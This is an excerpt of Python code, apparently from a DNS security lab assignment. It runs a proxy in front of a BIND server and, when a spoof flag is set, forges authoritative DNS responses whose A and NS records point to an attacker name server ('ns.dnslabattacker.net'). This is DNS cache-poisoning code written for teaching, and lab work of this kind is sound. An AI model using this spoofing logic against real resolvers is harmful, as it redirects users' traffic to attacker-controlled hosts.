...
def handler(data):
    bind_packet = DNS(data)
    print(bind_packet.show())
    ...
    fake_an = DNSRR(rrname=bind_packet.an.rrname, type='A', rdata="1.2.3.4", ttl=bind_packet.an.ttl)
    fake_ns = (DNSRR(rrname=bind_packet.ns[0].rrname, type='NS', rdata="ns.dnslabattacker.net", ttl=bind_packet.ns[0].ttl)/
               DNSRR(rrname=bind_packet.ns[1].rrname, type='NS', rdata="ns.dnslabattacker.net", ttl=bind_packet.ns[1].ttl))
    response = DNS(id=bind_packet.id, qr=1, opcode=bind_packet.opcode, aa=1, tc=bind_packet.tc, rd=bind_packet.rd,
                   ra=bind_packet.ra, z=bind_packet.z, rcode=bind_packet.rcode, qdcount=1, ancount=1, nscount=2, arcount=0,
                   qd=bind_packet.qd, an=fake_an, ns=fake_ns)
...
def run_proxy(proxy_port, dns_ip, dns_port, SPOOF):
    ...
    while True:
        ...
        client.sendto(data, (dns_ip, dns_port))
        bind_response, _ = client.recvfrom(4096)
        if not SPOOF:
            client.sendto(bind_response, addr)
        else:
            response = handler(bind_response)
...
if __name__ == "__main__":
    ...
    parser.add_argument("--port",
                        help="port to run your proxy on - careful to not run it on the same port as the BIND server",
                        type=int)
    ...
    parser.add_argument("--spoof_response", action="store_true",
                        help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2",
                        default=False)
